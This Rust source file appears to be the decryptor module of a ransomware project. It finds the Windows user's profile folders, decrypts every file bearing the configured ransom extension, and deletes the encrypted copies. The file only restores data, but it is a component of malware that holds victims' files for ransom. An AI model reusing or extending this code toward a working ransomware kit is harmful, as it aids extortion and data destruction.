// ==========================================================================//
//                          WALKER FOR THE DECRYPTOR                         //
// ==========================================================================//

// ======================= IMPORTS ========================
extern crate winapi;
use crate::encryption::decrypt;

use std::ffi::CString;
use std::fs;
use std::io;
use std::path::Path;
use std::ptr::null_mut;
use std::str;
use winapi::um::fileapi::DeleteFileA;
use winapi::um::winbase::GetUserNameA;

include!("config.rs"); // DIR_NAMES && RANSOM_EXT

// ======================= FUNCTIONS ========================

// Walks through folders (DIR_NAMES) decrypting anything it finds with the RANSOM_EXT
pub fn walk_decrypt() {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    unsafe {
        // Gets the size of the username and stores it in 'size'
        GetUserNameA(null_mut(), &mut size);
        // Resizes the buffer based on the username size and retrieves the name
        buffer.resize(size as usize, 0i8);
        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        // Converts the buffer to a byte vector and removes the null terminator
        let mut user_name: Vec<u8> = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8); // Adjust the size to remove the null terminator

        // Walks through the defined directories to search for and encrypt files
        for dir in DIR_NAMES.iter() {
            let mut full_path = String::from("C:\\Users\\");
            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
            full_path.push_str("\\");
            full_path.push_str(dir);
            let full_path_cs: CString = CString::new(full_path.as_bytes()).unwrap();
            println!("{}", full_path_cs.to_str().unwrap());
            let _walk_and_decrypt = walk_and_decrypt_path(&full_path);
        }
    }
}

// This function walks through files to decrypt them, accepting the directory in a `&str`
pub fn walk_and_decrypt_path(dir_path: &str) -> io::Result<()> {
    let dir = Path::new(dir_path);
    if dir.is_dir() {
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                // Converts the directory path to `&str` for the recursive call
                let subdir_str = path.to_str().unwrap_or("");
                walk_and_decrypt_path(subdir_str)?;
            } else {
                // Checks if the file has the ransomware extension
                if let Some(extension) = path.extension() {
                    if extension == RANSOM_EXT {
                        let source_path = path.to_str().unwrap_or("");
                        let mut dest_path = path.clone();
                        dest_path.set_extension(""); // Removes the ransom extension
                        let dest_path_str = dest_path.to_str().unwrap_or("");

                        println!("Decrypting: {} -> {}", source_path, dest_path_str);

                        let c_source = CString::new(source_path).expect("CString::new failed");
                        let c_dest = CString::new(dest_path_str).expect("CString::new failed");

                        // Calls `decrypt`
                        let result = decrypt(c_source.clone(), c_dest);
                        if !result {
                            println!("Error decrypting file: {}", source_path);
                        } else {
                            // Here should go the deletefile
                            let _delete_result = unsafe { DeleteFileA(c_source.as_ptr()) };
                        }
                    }
                }
            }
        }
    }
    Ok(())
}
